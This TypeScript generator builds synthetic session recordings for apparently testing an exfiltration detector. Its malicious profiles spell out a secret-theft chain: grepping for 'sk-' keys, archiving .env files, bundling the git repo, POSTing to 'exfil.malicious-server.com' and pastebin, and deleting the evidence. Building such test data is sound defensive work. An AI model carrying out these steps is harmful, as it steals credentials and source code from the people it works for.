'use strict';

import * as path from 'path';
import * as fs from 'fs';
import {
  RecordedSession, ScenarioEvent, generateId,
  NetworkFlow, ProcessEvent, FileAccessEvent, GitCommandEvent,
} from './types';

const SRC_IP = '192.168.1.100';
const SRC_PORT_BASE = 49000;

export interface SessionProfile {
  id: string;
  name: string;
  tags: string[];
  riskLevel: 'LOW' | 'MEDIUM' | 'HIGH' | 'CRITICAL';
  description: string;
}

interface GeneratorState {
  time: Date;
  eventIndex: number;
  profiles: string[];
}

type PartialEvent = Partial<ScenarioEvent> & { type: ScenarioEvent['type'] };

type GeneratorStep = (state: GeneratorState) => PartialEvent[];

function dur(base: number, jitter: number): number {
  return Math.max(1, base + Math.round((Math.random() - 0.5) * jitter * 2));
}

function nextTime(state: GeneratorState, msOffset: number): Date {
  return new Date(state.time.getTime() + msOffset);
}

// ─── Templates ──────────────────────────────────────────────────────

function idleTemplates(): GeneratorStep[] {
  return [
    (s) => {
      s.time = nextTime(s, dur(300, 200));
      return [{
        type: 'process',
        data: {
          pid: 1000 + dur(0, 50), name: 'node.exe',
          commandLine: 'node --version',
          timestamp: new Date(s.time), riskIndicators: [],
        } as ProcessEvent,
      }];
    },
  ];
}

function benignWorkflow(): GeneratorStep[] {
  return [
    (s) => {
      s.time = nextTime(s, dur(500, 300));
      return [{
        type: 'process',
        data: {
          pid: 2000 + dur(0, 50), name: 'code.exe',
          commandLine: 'code --new-window ' + (s.profiles[0] || '.'),
          timestamp: new Date(s.time), riskIndicators: [],
        } as ProcessEvent,
      }];
    },
    (s) => {
      s.time = nextTime(s, dur(800, 400));
      const fs: FileAccessEvent[] = [];
      for (let i = 0; i < dur(2, 2); i++) {
        fs.push({
          filePath: `C:/project/src/${['index.ts', 'app.ts', 'utils.ts', 'config.ts', 'types.ts'][i % 5]}`,
          processName: 'code.exe', pid: 2000, operation: 'read',
          timestamp: new Date(s.time), bytesRead: dur(1024, 512),
        });
      }
      return fs.map(f => ({ type: 'file_access' as const, data: f }));
    },
    (s) => {
      s.time = nextTime(s, dur(200, 100));
      return [{
        type: 'process',
        data: {
          pid: 3000 + dur(0, 50), name: 'npm.cmd',
          commandLine: 'npm install express typescript --save',
          timestamp: new Date(s.time), riskIndicators: [],
        } as ProcessEvent,
      }];
    },
    (s) => {
      s.time = nextTime(s, dur(1000, 500));
      const flows: NetworkFlow[] = [
        {
          id: generateId(), sessionId: '', timestamp: new Date(s.time),
          protocol: 'TLS', sourceAddr: SRC_IP, sourcePort: SRC_PORT_BASE + dur(0, 100),
          destAddr: '104.16.0.1', destPort: 443, hostname: 'registry.npmjs.org',
          sni: 'registry.npmjs.org',
          bytesSent: dur(512, 256), bytesReceived: dur(8192, 4096),
          durationMs: dur(200, 100), method: 'GET', path: '/express',
        },
        {
          id: generateId(), sessionId: '', timestamp: new Date(s.time),
          protocol: 'DNS', sourceAddr: SRC_IP, sourcePort: SRC_PORT_BASE + dur(1, 100),
          destAddr: '8.8.8.8', destPort: 53, hostname: '',
          bytesSent: 64, bytesReceived: 128,
          durationMs: dur(20, 10),
          dnsQuery: 'registry.npmjs.org', dnsResponse: ['104.16.0.1'],
        },
      ];
      return flows.map(f => ({ type: 'flow' as const, data: f }));
    },
    (s) => {
      s.time = nextTime(s, dur(500, 300));
      return [{
        type: 'git_command',
        data: {
          pid: 4000 + dur(0, 50), processName: 'git',
          commandLine: 'git status --porcelain',
          action: 'other', timestamp: new Date(s.time),
        } as GitCommandEvent,
      }];
    },
  ];
}

function suspiciousFileGather(): GeneratorStep[] {
  return [
    (s) => {
      s.time = nextTime(s, dur(300, 200));
      const fas: FileAccessEvent[] = [];
      const files = [
        '.env', '.env.prod', 'credentials.json', 'config/secrets.yml',
        'db/config/database.yml', 'deploy/ansible/vault.yml',
      ];
      for (const f of files) {
        fas.push({
          filePath: `C:/project/${f}`,
          processName: 'node.exe', pid: 5000, operation: 'read',
          timestamp: new Date(s.time), bytesRead: dur(2048, 1024),
        });
      }
      return fas.map(f => ({ type: 'file_access' as const, data: f }));
    },
    (s) => {
      s.time = nextTime(s, dur(500, 300));
      return [{
        type: 'process',
        data: {
          pid: 5001, name: 'curl.exe',
          commandLine: 'curl -s -o /dev/null -w "%{http_code}" https://private-paste.com/api/upload',
          timestamp: new Date(s.time), riskIndicators: ['network_tool'],
        } as ProcessEvent,
      }];
    },
    (s) => {
      s.time = nextTime(s, dur(200, 100));
      return [{
        type: 'flow',
        data: {
          id: generateId(), sessionId: '', timestamp: new Date(s.time),
          protocol: 'TLS', sourceAddr: SRC_IP, sourcePort: SRC_PORT_BASE + dur(2, 100),
          destAddr: '185.199.0.1', destPort: 443, hostname: 'private-paste.com',
          sni: 'private-paste.com',
          bytesSent: dur(4096, 2048), bytesReceived: 256,
          durationMs: dur(800, 400), method: 'POST', path: '/api/upload',
        } as NetworkFlow,
      }];
    },
  ];
}

function aiEmbeddingExtraction(): GeneratorStep[] {
  return [
    (s) => {
      s.time = nextTime(s, dur(100, 50));
      const fas: FileAccessEvent[] = [];
      const pattern = ['index.ts', 'app.ts', 'api/route.ts', 'db/schema.ts', 'utils/auth.ts',
        'components/Header.tsx', 'components/Footer.tsx', 'pages/index.tsx',
        'lib/db.ts', 'lib/api.ts', 'middleware.ts', 'config/env.ts',
        'package.json', 'tsconfig.json', 'next.config.js', 'tailwind.config.ts',
        'prisma/schema.prisma', 'docker-compose.yml', 'Dockerfile', 'README.md',
      ];
      for (const f of pattern) {
        fas.push({
          filePath: `C:/project/src/${f}`,
          processName: 'node.exe', pid: 6000, operation: 'read',
          timestamp: new Date(s.time), bytesRead: dur(4096, 2048),
        });
      }
      return fas.map(f => ({ type: 'file_access' as const, data: f }));
    },
    (s) => {
      s.time = nextTime(s, dur(200, 100));
      const flows: NetworkFlow[] = [
        {
          id: generateId(), sessionId: '', timestamp: new Date(s.time),
          protocol: 'TLS', sourceAddr: SRC_IP, sourcePort: SRC_PORT_BASE + dur(3, 100),
          destAddr: '104.20.0.1', destPort: 443, hostname: 'api.openai.com',
          sni: 'api.openai.com',
          bytesSent: dur(16384, 8192), bytesReceived: dur(4096, 2048),
          durationMs: dur(2000, 1000), method: 'POST', path: '/v1/embeddings',
        },
        {
          id: generateId(), sessionId: '', timestamp: new Date(s.time),
          protocol: 'DNS', sourceAddr: SRC_IP, sourcePort: SRC_PORT_BASE + dur(4, 100),
          destAddr: '8.8.8.8', destPort: 53,
          bytesSent: 64, bytesReceived: 128,
          durationMs: dur(20, 10),
          dnsQuery: 'api.openai.com', dnsResponse: ['104.20.0.1'],
        },
      ];
      return flows.map(f => ({ type: 'flow' as const, data: f }));
    },
  ];
}

function gitExfiltration(): GeneratorStep[] {
  return [
    (s) => {
      s.time = nextTime(s, dur(500, 300));
      return [{
        type: 'process',
        data: {
          pid: 7000, name: 'git',
          commandLine: 'git bundle create /tmp/repo.bundle --all',
          timestamp: new Date(s.time), riskIndicators: ['git_export'],
        } as ProcessEvent,
      }];
    },
    (s) => {
      s.time = nextTime(s, dur(200, 100));
      return [{
        type: 'git_command',
        data: {
          pid: 7000, processName: 'git',
          commandLine: 'git bundle create /tmp/repo.bundle --all',
          action: 'bundle', timestamp: new Date(s.time),
          repository: 'C:/project',
        } as GitCommandEvent,
      }];
    },
    (s) => {
      s.time = nextTime(s, dur(300, 200));
      return [{
        type: 'file_access',
        data: {
          filePath: '/tmp/repo.bundle',
          processName: 'curl.exe', pid: 7001, operation: 'read',
          timestamp: new Date(s.time), bytesRead: dur(65536, 32768),
        } as FileAccessEvent,
      }];
    },
    (s) => {
      s.time = nextTime(s, dur(200, 100));
      return [{
        type: 'flow',
        data: {
          id: generateId(), sessionId: '', timestamp: new Date(s.time),
          protocol: 'TLS', sourceAddr: SRC_IP, sourcePort: SRC_PORT_BASE + dur(5, 100),
          destAddr: '192.0.2.1', destPort: 443, hostname: 'exfil.malicious-server.com',
          sni: 'exfil.malicious-server.com',
          bytesSent: dur(131072, 65536), bytesReceived: 128,
          durationMs: dur(5000, 2000), method: 'POST', path: '/upload',
        } as NetworkFlow,
      }];
    },
    (s) => {
      s.time = nextTime(s, dur(100, 50));
      return [{
        type: 'process',
        data: {
          pid: 7002, name: 'rm',
          commandLine: 'rm -f /tmp/repo.bundle',
          timestamp: new Date(s.time), riskIndicators: ['cleanup'],
        } as ProcessEvent,
      }];
    },
  ];
}

function prepCommandSequence(): GeneratorStep[] {
  return [
    (s) => {
      s.time = nextTime(s, dur(200, 100));
      return [
        { type: 'process', data: { pid: 8000, name: 'find.exe', commandLine: 'find . -type f -name "*.env"', timestamp: new Date(s.time), riskIndicators: ['recon'] } as ProcessEvent },
        { type: 'process', data: { pid: 8001, name: 'grep.exe', commandLine: 'grep -r "sk-" --include="*.env" --include="*.json" .', timestamp: nextTime(s, dur(100, 50)), riskIndicators: ['recon'] } as ProcessEvent },
        { type: 'process', data: { pid: 8002, name: 'git', commandLine: 'git remote -v', timestamp: nextTime(s, dur(100, 50)), riskIndicators: ['recon'] } as ProcessEvent },
      ];
    },
    (s) => {
      s.time = nextTime(s, dur(500, 300));
      return [{
        type: 'process',
        data: {
          pid: 8003, name: 'tar.exe',
          commandLine: 'tar -czf /tmp/project.tar.gz src/ config/ .env',
          timestamp: new Date(s.time), riskIndicators: ['archive'],
        } as ProcessEvent,
      }];
    },
  ];
}

function benignGitOperations(): GeneratorStep[] {
  return [
    (s) => {
      s.time = nextTime(s, dur(300, 200));
      return [
        { type: 'git_command', data: { pid: 9000, processName: 'git', commandLine: 'git log --oneline -5', action: 'log', timestamp: new Date(s.time) } as GitCommandEvent },
        { type: 'git_command', data: { pid: 9000, processName: 'git', commandLine: 'git diff --stat', action: 'other', timestamp: nextTime(s, dur(100, 50)) } as GitCommandEvent },
      ];
    },
    (s) => {
      s.time = nextTime(s, dur(500, 300));
      return [{
        type: 'process',
        data: {
          pid: 9001, name: 'git',
          commandLine: 'git push origin main',
          timestamp: new Date(s.time), riskIndicators: [],
        } as ProcessEvent,
      }];
    },
    (s) => {
      s.time = nextTime(s, dur(300, 200));
      return [{
        type: 'flow',
        data: {
          id: generateId(), sessionId: '', timestamp: new Date(s.time),
          protocol: 'TLS', sourceAddr: SRC_IP, sourcePort: SRC_PORT_BASE + dur(6, 100),
          destAddr: '140.82.112.4', destPort: 443, hostname: 'github.com',
          sni: 'github.com',
          bytesSent: dur(2048, 1024), bytesReceived: dur(1024, 512),
          durationMs: dur(1000, 500), method: 'GET', path: '/user/project',
        } as NetworkFlow,
      }];
    },
  ];
}

function canaryTrigger(): GeneratorStep[] {
  return [
    (s) => {
      s.time = nextTime(s, dur(200, 100));
      return [{
        type: 'file_access',
        data: {
          filePath: 'C:/project/.sentinel/canaries/api_keys_internal.json',
          processName: 'node.exe', pid: 10000, operation: 'read',
          timestamp: new Date(s.time), bytesRead: 1024,
        } as FileAccessEvent,
      }];
    },
    (s) => {
      s.time = nextTime(s, dur(100, 50));
      return [{
        type: 'file_access',
        data: {
          filePath: 'C:/project/.sentinel/canaries/aws_credentials_prod.json',
          processName: 'node.exe', pid: 10000, operation: 'read',
          timestamp: new Date(s.time), bytesRead: 2048,
        } as FileAccessEvent,
      }];
    },
    (s) => {
      s.time = nextTime(s, dur(300, 200));
      return [{
        type: 'flow',
        data: {
          id: generateId(), sessionId: '', timestamp: new Date(s.time),
          protocol: 'TLS', sourceAddr: SRC_IP, sourcePort: SRC_PORT_BASE + dur(7, 100),
          destAddr: '104.20.0.143', destPort: 443, hostname: 'pastebin.com',
          sni: 'pastebin.com',
          bytesSent: dur(8192, 4096), bytesReceived: 256,
          durationMs: dur(1500, 500), method: 'POST', path: '/api/api_post.php',
          bodyPreview: `SENTINEL_CANARY_TOKEN_${Math.random().toString(36).substring(2, 10)}`,
        } as NetworkFlow,
      }];
    },
  ];
}

// ─── Profiles ───────────────────────────────────────────────────────

const PROFILES: Array<{ name: string; tags: string[]; riskLevel: 'LOW'|'MEDIUM'|'HIGH'|'CRITICAL'; steps: (() => GeneratorStep[])[] }> = [
  {
    name: 'benign_edit_and_install',
    tags: ['benign', 'npm', 'editor'],
    riskLevel: 'LOW',
    steps: [benignWorkflow, benignGitOperations, idleTemplates],
  },
  {
    name: 'benign_reading_docs',
    tags: ['benign', 'editor'],
    riskLevel: 'LOW',
    steps: [
      () => benignWorkflow().slice(0, 2),
      () => [(state) => [{
        type: 'flow',
        data: {
          id: generateId(), sessionId: '', timestamp: new Date(state.time),
          protocol: 'TLS', sourceAddr: SRC_IP, sourcePort: SRC_PORT_BASE + 10,
          destAddr: '151.101.1.140', destPort: 443, hostname: 'docs.npmjs.com',
          sni: 'docs.npmjs.com',
          bytesSent: 512, bytesReceived: 16384,
          durationMs: 500, method: 'GET', path: '/cli/v10/commands/npm-install',
        } as NetworkFlow,
      }]],
    ],
  },
  {
    name: 'suspicious_env_gather',
    tags: ['suspicious', 'recon'],
    riskLevel: 'MEDIUM',
    steps: [suspiciousFileGather, benignGitOperations],
  },
  {
    name: 'ai_embedding_extraction',
    tags: ['suspicious', 'ai'],
    riskLevel: 'MEDIUM',
    steps: [aiEmbeddingExtraction],
  },
  {
    name: 'git_bundle_exfil',
    tags: ['malicious', 'git', 'exfil'],
    riskLevel: 'HIGH',
    steps: [gitExfiltration],
  },
  {
    name: 'prep_command_recon',
    tags: ['malicious', 'recon', 'prep'],
    riskLevel: 'HIGH',
    steps: [prepCommandSequence, suspiciousFileGather],
  },
  {
    name: 'full_exfiltration_chain',
    tags: ['malicious', 'exfil', 'chain'],
    riskLevel: 'CRITICAL',
    steps: [prepCommandSequence, aiEmbeddingExtraction, gitExfiltration, canaryTrigger],
  },
  {
    name: 'canary_trigger_exfil',
    tags: ['malicious', 'canary', 'exfil'],
    riskLevel: 'CRITICAL',
    steps: [canaryTrigger],
  },
  {
    name: 'benign_npm_workflow',
    tags: ['benign', 'npm'],
    riskLevel: 'LOW',
    steps: [
      () => benignWorkflow().slice(0, 4),
      benignGitOperations,
    ],
  },
  {
    name: 'mixed_suspicious_git',
    tags: ['suspicious', 'git', 'recon'],
    riskLevel: 'MEDIUM',
    steps: [benignGitOperations, suspiciousFileGather],
  },
];

// ─── Generator ──────────────────────────────────────────────────────

export interface GenerateOptions {
  count?: number;
  outputDir?: string;
  seed?: number;
  profileWeights?: Record<string, number>;
}

export class SessionGenerator {
  private eventIdCounter = 0;

  constructor() {
    this.eventIdCounter = 0;
  }

  generateAll(options: GenerateOptions = {}): RecordedSession[] {
    const count = options.count ?? 200;
    const outputDir = options.outputDir || path.join(process.cwd(), 'replay-corpus', 'synthetic');
    const sessions: RecordedSession[] = [];

    if (!fs.existsSync(outputDir)) {
      fs.mkdirSync(outputDir, { recursive: true });
    }

    for (let i = 0; i < count; i++) {
      const profile = PROFILES[i % PROFILES.length];
      const session = this.generateFromProfile(profile, i);
      sessions.push(session);

      const filePath = path.join(outputDir, `${profile.name}_${String(i).padStart(3, '0')}.json`);
      fs.writeFileSync(filePath, JSON.stringify(session, null, 2), 'utf-8');
    }

    // Write manifest
    const manifest = {
      generatedAt: new Date().toISOString(),
      totalSessions: sessions.length,
      profiles: PROFILES.map(p => p.name),
      distribution: sessions.reduce((acc, s) => {
        const level = s.metadata.tags.find(t => ['LOW', 'MEDIUM', 'HIGH', 'CRITICAL'].includes(t)) || 'unknown';
        acc[level] = (acc[level] || 0) + 1;
        return acc;
      }, {} as Record<string, number>),
    };
    fs.writeFileSync(path.join(outputDir, 'manifest.json'), JSON.stringify(manifest, null, 2), 'utf-8');

    // Write ground truth CSV
    const csvLines = ['session_id,name,risk_level,file'];
    for (let i = 0; i < sessions.length; i++) {
      const s = sessions[i];
      const profile = PROFILES[i % PROFILES.length];
      csvLines.push(`${s.metadata.id},${profile.name},${profile.riskLevel},${profile.name}_${String(i).padStart(3, '0')}.json`);
    }
    fs.writeFileSync(path.join(outputDir, 'ground_truth.csv'), csvLines.join('\n'), 'utf-8');

    console.log(`Generated ${sessions.length} sessions in ${outputDir}`);
    console.log(`  Profiles: ${PROFILES.map(p => p.name).join(', ')}`);
    console.log(`  Manifest: manifest.json`);
    console.log(`  Ground truth: ground_truth.csv`);

    return sessions;
  }

  generateFromProfile(profile: typeof PROFILES[0], seed: number): RecordedSession {
    this.eventIdCounter = 0;
    const baseTime = new Date();
    baseTime.setMinutes(baseTime.getMinutes() - 5);

    const state: GeneratorState = {
      time: baseTime,
      eventIndex: seed * 1000,
      profiles: [`C:/project-${seed}`],
    };

    const events: ScenarioEvent[] = [];

    for (const stepGroup of profile.steps) {
      const steps = stepGroup();
      for (const step of steps) {
        const partials = step(state);
        for (const p of partials) {
          const event = {
            type: p.type,
            data: p.data!,
          } as ScenarioEvent;
          events.push(event);
          this.eventIdCounter++;
        }
      }
    }

    const endTime = new Date(state.time.getTime() + dur(1000, 500));

    const session: RecordedSession = {
      format: 'sentinel-session-v1',
      metadata: {
        id: `gen-${generateId()}`,
        recordedAt: baseTime.toISOString(),
        durationMs: endTime.getTime() - baseTime.getTime(),
        platform: 'win32',
        sentinelVersion: '1.0.0',
        tags: [...profile.tags, profile.riskLevel, 'generated'],
      },
      private: {
        hostname: 'generator',
        username: 'eval',
        workingDirectory: `C:/project-${seed}`,
      },
      events,
    };

    return session;
  }

  getProfiles(): typeof PROFILES {
    return PROFILES;
  }
}
